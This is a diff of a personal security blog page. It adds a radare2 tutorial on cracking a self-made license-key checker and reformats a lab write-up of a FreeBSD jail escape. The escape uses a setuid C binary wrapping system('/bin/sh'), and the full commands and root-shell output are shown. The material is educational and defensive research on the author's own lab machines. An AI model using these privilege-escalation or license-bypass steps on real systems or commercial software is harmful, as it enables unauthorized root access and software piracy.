@@ -1,59 +1,291 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="utf-8">
-        <meta name="viewport" 
-          content="width=device-width, initial-scale=1.0">
-          <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Roboto:wght@400;700&family=Lato:wght@400;700&family=Source+Sans+Pro:wght@400;700&family=Muli:wght@400;700&display=swap" rel="stylesheet">
-        <link rel="stylesheet" type="text/css" href="css/styles.css">
-        <title>ASX</title>
-    </head>
-    <body>
-        <div class="main">
-            <fieldset>
-                <span><p>Dark:</p>
-                <button id="dark" class="dark" onclick="myFunction()">0</button></span>
-                <div class="profile">
-                        <a href="index.html"><img src="assets/general/asx.png" id ="profileImg"></a>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Roboto:wght@400;700&family=Lato:wght@400;700&family=Source+Sans+Pro:wght@400;700&family=Muli:wght@400;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="css/styles.css">
+    <title>ASX</title>
+</head>
+
+<body>
+    <div class="main">
+        <fieldset>
+            <span>
+                <p>Dark:</p>
+                <button id="dark" class="dark" onclick="myFunction()">0</button>
+            </span>
+            <div class="profile">
+                <a href="index.html"><img src="assets/general/asx.png" id="profileImg"></a>
+            </div>
+            <div class="name">
+                <h1>ASX</h1>
+            </div>
+            <div class="quote">
+                <p id="quote"><strong></strong></p>
+            </div>
+            <div class="nav">
+                <a href="posts.html">Posts</a>
+                <a href="projects.html">Projects</a>
+                <a href="about.html">About</a>
+            </div>
+            <div class="nav">
+                <a href="https://github.com/wmi">Github</a>
+                <a href="https://www.linkedin.com/in/remi-cantigneaux">LinkedIn</a>
+                <a href="mailto:webcnremi@gmail.com">Contact</a>
+            </div>
+        </fieldset>
+        <fieldset>
+            <h1>Reversing 1: Bypass license key checker program.</h1>
+            <p class="date">Written on 2024-11-09</p>
+            <h2>Resume</h2>
+            <p>Reverse engineering a C program under linux using radare2 to find the license key.</p>
+            <div class="show-more" id="show-more-2">
+                <h2>Requirements</h2>
+                <li>Linux machine</li>
+                <li>Asm knowledge</li>
+                <li>C knowledge</li>
+                <h2>Info</h2>
+                <p>You can download the binary here: <a href="https://github.com/webRemi/Reversing/blob/main/reversing1/licenseChecker">licenseChecker</a></p>
+                <h2>Process</h2>
+                <p>It is always important to use the 'file' command to know the type of file going under analyze. We can see that it is an ELF x64 program.</p>
+                <!--IN the end-->
+                <div class="project-image">
+                    <img src="assets/posts/reversing/file.png">
                 </div>
-                <div class="name">
-                    <h1>ASX</h1>
+                <p>It is interesting to analyze dynamically so let’s run the program. Warning: please always analyze unknown files in a sandbox so as not to be infected.</p>
+                <p>Let’s enter the test key and see what happens.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/test.png">
                 </div>
-                <div class="quote">
-                    <p id="quote"><strong></strong></p>
+                <p>The program seems to accept license keys of 10 characters long. Let’s test with a longer key.</p>
+                <p>Using the longerpass key we realize his disability, which brings us to the point of departure. We will pass the program in dynamic analysis using the debugger.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/test2.png">
                 </div>
-                <div class="nav">
-                        <a href="posts.html">Posts</a>
-                        <a href="projects.html">Projects</a>
-                        <a href="about.html">About</a>
+                <p>I use Radare2 almost all the time because it is really very practical contains many features and I prefer to do as many tasks possible under terminal rather than under GUI.</p>
+                <p>Open the program in dynamic mode using the '-d' option.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/1.png">
                 </div>
-                <div class="nav">
-                    <a href="https://github.com/wmi">Github</a>
-                    <a href="https://www.linkedin.com/in/remi-cantigneaux">LinkedIn</a>
-                    <a href="mailto:webcnremi@gmail.com">Contact</a>
+                <p>It is then recommended to have knowledge of all the functions contained in the program.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/2.png">
                 </div>
-            </fieldset>
-            <fieldset><legend>Exclusive</legend>
-                <h1>Jail: The enigmatic cooperative rooting.</h1>
-                <p class="date">Written on 2024-10-28</p>
-                <h2>Resume</h2>
-                <p>The rooting and compromise of a FreeBSD machine was accomplished in close collaboration by the restricted user inside the jail and by the user outside the jail.</p>
-                <div class="show-more" id="show-more-1">
-                    <h2>Requirements</h2> 
-                        <li>Root account inside the jail</li>
-                        <li>Cooperative user account outside the jail</li>
-                        <li>C knowledge</li>
-                        <li>Permissions knowledge</li>
-                        <li>FreeBSD system knowledge</li>
-                    </p>
-                    <h2>Exploit</h2>
-                    <p>Let’s start by entering the machine as a normal user.</p>
-                    <div class="code">
-                        <div class="command">
-                            <p>[asx@cortex]> ssh katty@192.168.52.137</p>
-                        </div>
-                        <div class="output">
-                            <pre>
+                <p>3 really important functions are distinguished here: main, modify_key, check_key. We can already deduce that the program takes the key, modifies it and finally compares it with the correct key.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/3.png">
+                </div>
+                <p>Break main and hit the breakpoint so we can analyze what's inside it.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/4.png">
+                </div>
+                <p>Now that we are inside hand. A function catches our attention (fgets) that takes our license key and returns it to a variable. Let’s go down further in the program.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/5.png">
+                </div>
+                <p>One variable immediately draws attention: var_1bh address passed to rax then content of memory at this address passed to rdi just before going into the modify_key function. We also see that the check_key function is called finally.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/6.png">
+                </div>
+                <p>Let’s break this line to observe the registers and find out if our assumptions were correct. (var_1bh would contain the string that we passed to the program).</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/7.png">
+                </div>
+                <p>An address has been passed to the rax register. Probably that of our key entered.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/8.png">
+                </div>
+                <p>By analyzing the content of this address we were right: our string is there!</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/9.png">
+                </div>
+                <p>We will now break to the function modify_key and step into.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/10.png">
+                </div>
+                <p>We can now hit 'ds' to step into the modify_key function.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/11.png">
+                </div>
+                <p>It seems that our string is passed into the variable var_18h. And then this variable is passed into rax.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/12.png">
+                </div>
+                <p>By then we see that a byte will be stored in var_1h so this must be a byte to the address containing our string.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/13.png">
+                </div>
+                <p>The byte at this address was stored in rax let's verify using memory analysis.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/14.png">
+                </div>
+                <p>Based on assembly instructions we can see that 0x6c (l) is the byte who moved to var_1h.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/15.png">
+                </div>
+                <p>Using some command line linux tools, we can verify the our suppositions: 0x6c -> 108 -> l</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/16.png">
+                </div>
+                <p>This instruction will zeroout the eax register.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/18.png">
+                </div>
+                <p>The byte located at address rax+9 will then be moved into the edx register zeroout the rest.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/17.png">
+                </div>
+                <p>Let’s calculate this address. (calc program is a homemade and can be downloaded here <a href="https://github.com/webRemi/hexaCalc">HexaCalc</a>).</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/19.png">
+                </div>
+                <p>By analyzing this address we find that the byte 0x73 (letter s) will be moved in the edx register.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/20.png">
+                </div>
+                <p>Rdx contains the letter s (0x73).</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/21.png">
+                </div>
+                <p>Let’s use the command line tools again: We can observe that 0x73 -> 115 -> s.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/22.png">
+                </div>
+                <p>It will now write to the place of the address of rax the byte contained in rdx so the letter s will be written in the memory where was the letter l.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/23.png">
+                </div>
+                <p>Our doubts were clear, the letter l was replaced by the letter s. Our key has therefore been modified!</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/24.png">
+                </div>
+                <p>It will now use 'lea' instruction to load in rdx the rax+9 address so end of our key. (Address 0x7fffd45efa7e) in rdx. It will then place the value of the variable var_1h in the register rax. Remember, this variable contains our letter 'l' (0x6c). Rdx containing the address of our last letter. The byte in the rax register (0x6c) will be written to the address contained in rdx.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/25.png">
+                </div>
+                <p>We can also see that the address will be restored and contained in rax.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/27.png">
+                </div>
+                <p>By observing the memory of the address now contained in rax. We see that the last letter is a 'l' (0x6c). We find that the first and last letter of our word have been exchanged!</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/28.png">
+                </div>
+                <p>Mettons un breakpoint a l’adresse de la fonction check_key et entrons dedans (step-into). Desassemblons la utilisant la commande 'pd'.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/29.png">
+                </div>
+                <p>The str.correctkey will be load in rdx. we can then see it pass as argument for strcmp. We also see that the address of our key will be passed in rdi. The strcmp function is called with our key and the correctkey string as arguments. It is not difficult to understand that these two will be compared.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/30.png">
+                </div>
+                <p>Let’s check all these assumptions: By analyzing the rdx register, it contains an address.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/31.png">
+                </div>
+                <p>And it is the correct string key that is stored there. (00 are used in C for ' 0' the null terminator indicating a program the end of a string).</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/32.png">
+                </div>
+                <p>Finally we understand that the value returned by the comparison function (strcmp) will be tested and goes if not equal jump to address where the Incorrect string is retained. But if the testing is correct it will not jumper and load the string Correct in rax. The string in rax is then moved into the rdi register which serves as an argument for the output (puts function).</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/33.png">
+                </div>
+                <p>Let’s continue the program. Our key enters it displays 'Incorrect'.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/34.png">
+                </div>
+                <p>It is easy to crack the key now: The real key is 'correctkey', our key is modified by exchanging the first and last letter. We just need to enter yorrectkec to enter the license key. We get a validation.</p>
+                <p>For the most interested of you, here is the C-program of our license checker:</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/licenseChecker.png">
+                </div>
+                <p>You can download the source code here: <a href="https://github.com/webRemi/Reversing/blob/main/reversing1/licenseChecker.c">licenseChecker.c</a></p>
+                <h2>Quick bypass</h2>
+                <p>We can for sure use quick bypasses to get the job done.</p>
+                <h3>Modifying value in program</h3>
+                <p>By modifying value of eax before it is compared we can trick program to give us correct statement.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/bypass1.png">
+                </div>
+                <p>We see we entered the wrong key but no panick. This condition test if eax is equal to 0 if yes it will go to 'Correct' otherwise it will jump to 'Incorrect'.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/bypass12.png">
+                </div>
+                <p>We see eax is set to 10 so it will jump to 'Incorrect'.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/bypass13.png">
+                </div>
+                <p>We can set the eax register to value 0 to trick program to skip the jump and modify the control flow.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/bypass14.png">
+                </div>
+                <p>By modifying it we trickier the program flow to go to 'Correct'.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/bypass15.png">
+                </div>
+                <h3>Static analysis</h3>
+                <p>We can use string command or use 'iz' command in r2 to get all the strings in the program.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/bypass2.png">
+                </div>
+                <p>Strings command filtering size 10 strings.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/bypass21.png">
+                </div>
+                <p>'iz' command to extract strings from program.</p>
+                <h3>Going direct to the end</h3>
+                <p>We can also go direct to the end of the program before the check_key function to examine memory and see the modified string.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/bypass3.png">
+                </div>
+                <p>We can set breakpoint before the check function.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/bypass31.png">
+                </div>
+                <p>Watching for memory location of our entered key.</p>
+                <div class="project-image">
+                    <img src="assets/posts/reversing/bypass32.png">
+                </div>
+                <p>See the string in memory with all the changes. So we discover direct swaping. I really don't like skipping parts like this since i prefer analyzing slowly code and understand what happened.</p>
+                <h2>Conclusion</h2>
+                <p>By reading the assembly instructions and following the program flow we can easily determine the license key and if anti-analyze measures such as modifying the user input we have learned to determine them and bypass them. We also learned some cool bypass tricks and remember the most you can read assembly the most you can start understanding any closed source code.</p>
+            </div>
+            <div class="info">
+                <p>Reverse engineering</p>
+                <p>R2</p>
+                <p>License checker</p>
+                <p>Bypass key</p>
+                <p>C</p>
+            </div><input classe="fleche bas" id="button-more" type="button" value="&#9660;">
+        </fieldset>
+        <fieldset>
+            <legend>Exclusive</legend>
+            <h1>Jail: The enigmatic cooperative rooting.</h1>
+            <p class="date">Written on 2024-10-28</p>
+            <h2>Resume</h2>
+            <p>The rooting and compromise of a FreeBSD machine was accomplished in close collaboration by the restricted
+                user inside the jail and by the user outside the jail.</p>
+            <div class="show-more" id="show-more-1">
+                <h2>Requirements</h2>
+                <li>Root account inside the jail</li>
+                <li>Cooperative user account outside the jail</li>
+                <li>C knowledge</li>
+                <li>Permissions knowledge</li>
+                <li>FreeBSD system knowledge</li>
+                </p>
+                <h2>Exploit</h2>
+                <p>Let’s start by entering the machine as a normal user.</p>
+                <div class="code">
+                    <div class="command">
+                        <p>[asx@cortex]> ssh katty@192.168.52.137</p>
+                    </div>
+                    <div class="output">
+                        <pre>
 (katty@192.168.52.137) Password for katty@jail-escape:
 Last login: Wed Dec 20 14:49:47 2023 from 192.168.52.145
 FreeBSD 14.0-RELEASE-p3 (GENERIC) #0: Mon Dec 11 04:56:01 UTC 2023
@@ -86,31 +318,31 @@ To change an environment variable in /bin/sh use:
 
 $ VARIABLE="value"
 $ export VARIABLE
-                            </pre>
-                        </div>
-                        <div class="command">
-                            <p>katty@jail-escape:~ $</p>
-                        </div>
+                                </pre>
                     </div>
-                    <p>Log in as root user inside the jail.</p>
-                    <div class="code">
-                        <div class="command">
-                            <p>[asx@cortex]> ssh root@192.168.52.137</p>
-                        </div>
-                        <div class="output">
-                            <pre>
+                    <div class="command">
+                        <p>katty@jail-escape:~ $</p>
+                    </div>
+                </div>
+                <p>Log in as root user inside the jail.</p>
+                <div class="code">
+                    <div class="command">
+                        <p>[asx@cortex]> ssh root@192.168.52.137</p>
+                    </div>
+                    <div class="output">
+                        <pre>
 (root@192.168.52.137) Password for root@jail-escape:
 (root@192.168.52.137) Password for root@jail-escape:
-                            </pre>
-                        </div>
+                                </pre>
                     </div>
-                    <p>The problem is that despite the root account, we are locked in a jail with restricted access.</p>
-                    <div class="code">
-                        <div class="command">
-                            <p>root@jail-escape:~ # ls -la</p>
-                        </div>
-                        <div class="output">
-                            <pre>
+                </div>
+                <p>The problem is that despite the root account, we are locked in a jail with restricted access.</p>
+                <div class="code">
+                    <div class="command">
+                        <p>root@jail-escape:~ # ls -la</p>
+                    </div>
+                    <div class="output">
+                        <pre>
 total 37
 drwxr-x---   3 root wheel    9 Dec 20 16:10 .
 drwxr-xr-x  14 root wheel   24 Dec 18 21:23 ..
@@ -121,125 +353,133 @@ drwxr-xr-x  14 root wheel   24 Dec 18 21:23 ..
 lrwxr-xr-x   1 root wheel    9 Dec 20 16:10 .sh_history -> /dev/null
 -rw-r--r--   1 root wheel 1174 Dec 17 23:04 .shrc
 drwx------   2 root wheel    4 Dec 20 13:57 .ssh
-                            </pre>
-                        </div>
-                        <div class="command">
-                            <p>root@jail-escape:~ #</p>
-                        </div>
+                                </pre>
                     </div>
-                    <p>For this exploit works we need a compiler in the host. "cc" is especially useful when gcc is not available on the host.</p>
-                    <div class="code">
-                        <div class="command">
-                            <p>root@jail-escape:/home/steven1/documents # which cc</p>
-                        </div>
-                        <div class="output">
-                            <p>/usr/bin/cc</p>
-                        </div>
+                    <div class="command">
+                        <p>root@jail-escape:~ #</p>
                     </div>
-                    <p>Time to write the exploit in c</p>
-                    <div class="code">
-                        <div class="command">
-                            <p>root@jail-escape:/home/steven1/documents # ee exploit.c</p>
-                        </div>
-                        <div class="command">
-                            <p>root@jail-escape:/home/steven1/documents # cat exploit.c</p>
-                        </div>
-                        <div class="output">
-                            <pre>
+                </div>
+                <p>For this exploit works we need a compiler in the host. "cc" is especially useful when gcc is not
+                    available on the host.</p>
+                <div class="code">
+                    <div class="command">
+                        <p>root@jail-escape:/home/steven1/documents # which cc</p>
+                    </div>
+                    <div class="output">
+                        <p>/usr/bin/cc</p>
+                    </div>
+                </div>
+                <p>Time to write the exploit in c</p>
+                <div class="code">
+                    <div class="command">
+                        <p>root@jail-escape:/home/steven1/documents # ee exploit.c</p>
+                    </div>
+                    <div class="command">
+                        <p>root@jail-escape:/home/steven1/documents # cat exploit.c</p>
+                    </div>
+                    <div class="output">
+                        <pre>
 #include &lt;stdlib.h&gt;
 
 int main(void) {
     system("/bin/sh");
 }
-                            </pre>
-                        </div>
+                                </pre>
                     </div>
-                    <p>Now we can set rights and compile.</p>
-                    <div class="code">
-                        <div class="command">
-                            <p>root@jail-escape:/home/steven1 # cd doc*</p>
-                            <p>root@jail-escape:/home/steven1/documents # which cc</p>
-                        </div>
-                        <div class="output">
-                            <pre>
+                </div>
+                <p>Now we can set rights and compile.</p>
+                <div class="code">
+                    <div class="command">
+                        <p>root@jail-escape:/home/steven1 # cd doc*</p>
+                        <p>root@jail-escape:/home/steven1/documents # which cc</p>
+                    </div>
+                    <div class="output">
+                        <pre>
 /usr/bin/cc
-                            </pre>
-                        </div>
-                        <div class="command">
-                            <p>root@jail-escape:/home/steven1/documents # cc exploit.c -o exploit</p>
-                            <p>root@jail-escape:/home/steven1/documents # chmod u+s exploit</p>
-                            <p>root@jail-escape:/home/steven1/documents # ls -la exploit</p>
-                        </div>
-                        <div class="output">
-                            <pre>
--rwsr-xr-x  1 root steven1 9664 Dec 20 16:43 exploit
-                            </pre>
-                        </div>
+                                </pre>
                     </div>
-                    <p>We are exploiting the setuid bit and bad environment configurations. Since the path to the created file is not restricted, if we run this root file in the jail, we will become root outside of the jail, and therefore on the host machine.</p>
-                    <div class="code">
-                        <div class="command">
-                            <p>katty@jail-escape:~ $ cd /usr/jails/steven1/home/steven1/documents/</p>
-                            <p>katty@jail-escape:/usr/jails/steven1/home/steven1/documents $ /bin/ls -la</p>
-                        </div>
-                        <div class="output">
-                            <pre>
+                    <div class="command">
+                        <p>root@jail-escape:/home/steven1/documents # cc exploit.c -o exploit</p>
+                        <p>root@jail-escape:/home/steven1/documents # chmod u+s exploit</p>
+                        <p>root@jail-escape:/home/steven1/documents # ls -la exploit</p>
+                    </div>
+                    <div class="output">
+                        <pre>
+-rwsr-xr-x  1 root steven1 9664 Dec 20 16:43 exploit
+                                </pre>
+                    </div>
+                </div>
+                <p>We are exploiting the setuid bit and bad environment configurations. Since the path to the created
+                    file is not restricted, if we run this root file in the jail, we will become root outside of the
+                    jail, and therefore on the host machine.</p>
+                <div class="code">
+                    <div class="command">
+                        <p>katty@jail-escape:~ $ cd /usr/jails/steven1/home/steven1/documents/</p>
+                        <p>katty@jail-escape:/usr/jails/steven1/home/steven1/documents $ /bin/ls -la</p>
+                    </div>
+                    <div class="output">
+                        <pre>
 total 19
 drwxr-xr-x  2 katty   katty    5 Dec 20 16:43 .
 drwxr-xr-x  4 steven1 wheel   12 Dec 20 16:10 ..
 -rwsr-xr-x  1 root    katty 9664 Dec 20 16:43 exploit
 -rwSr--r--  1 root    katty   62 Dec 20 16:34 exploit.c
-                            </pre>
-                        </div>
+                                </pre>
                     </div>
-                    <p>The trick is there we will run the file as external user from the jail</p>
-                    <div class="code">
-                        <div class="command">
-                            <p>katty@jail-escape:/usr/jails/steven1/home/steven1/documents $ ./exploit 
-                        </div>
-                        <div class="output">
-                            <pre>
+                </div>
+                <p>The trick is there we will run the file as external user from the jail</p>
+                <div class="code">
+                    <div class="command">
+                        <p>katty@jail-escape:/usr/jails/steven1/home/steven1/documents $ ./exploit
+                    </div>
+                    <div class="output">
+                        <pre>
 #
-                            </pre>
-                        </div>
-                        <div class="command">
-                            <p># /usr/bin/whoami; /usr/bin/id</p>
-                        </div>
-                        <div class="output">
-                            <pre>
+                                </pre>
+                    </div>
+                    <div class="command">
+                        <p># /usr/bin/whoami; /usr/bin/id</p>
+                    </div>
+                    <div class="output">
+                        <pre>
 root
 uid=1001(katty) gid=1001(katty) euid=0(root) groups=1001(katty)
-                            </pre>
-                        </div>
-                        <div class="command">
-                            <p># cd /root</p>
-                            <p># /bin/ls</p>
-                        </div>
-                        <div class="output">
-                            <pre>
+                                </pre>
+                    </div>
+                    <div class="command">
+                        <p># cd /root</p>
+                        <p># /bin/ls</p>
+                    </div>
+                    <div class="output">
+                        <pre>
 outside-jail.txt    scripts
-                            </pre>
-                        </div>
-                        <div class="command">
-                            <p># ezjail-admin list</p>
-                        </div>
-                        <div class="output">
-                            <pre>
+                                </pre>
+                    </div>
+                    <div class="command">
+                        <p># ezjail-admin list</p>
+                    </div>
+                    <div class="output">
+                        <pre>
 STA JID  IP              Hostname                       Root Directory
 --- ---- --------------- ------------------------------ ------------------------
 DR  1    192.168.0.10    jail-escape                    /usr/jails/steven1
-                            </pre>
-                        </div>
+                                </pre>
                     </div>
-                    <p>We have successfuly switched root privileges. Which concludes that with a little cooperation you can gain privileges on a freeBSD machine</p>
-                    <h2>Conclusion</h2>
-                    <p>We managed to escape from the jail in the latest version of FreeBSD using the techniques of using living of the land and external user! Note that the conditions to meet are quite rare cases.</p>
                 </div>
-                <div class="info">
-                    <p>FreeBSD</p><p>Jail</p><p>Exploit</p>
-                </div><input classe="fleche bas" id="button-more" type="button" value="&#9660;">
-            </fieldset>
-        </div>
-        <script src="js/script.js"></script>
-    </body>
+                <p>We have successfuly switched root privileges. Which concludes that with a little cooperation you can
+                    gain privileges on a freeBSD machine</p>
+                <h2>Conclusion</h2>
+                <p>We managed to escape from the jail in the latest version of FreeBSD using the techniques of using
+                    living of the land and external user! Note that the conditions to meet are quite rare cases.</p>
+            </div>
+            <div class="info">
+                <p>FreeBSD</p>
+                <p>Jail</p>
+                <p>Exploit</p>
+            </div><input classe="fleche bas" id="button-more" type="button" value="&#9660;">
+        </fieldset>
+    </div>
+    <script src="js/script.js"></script>
+</body>
+
 </html>
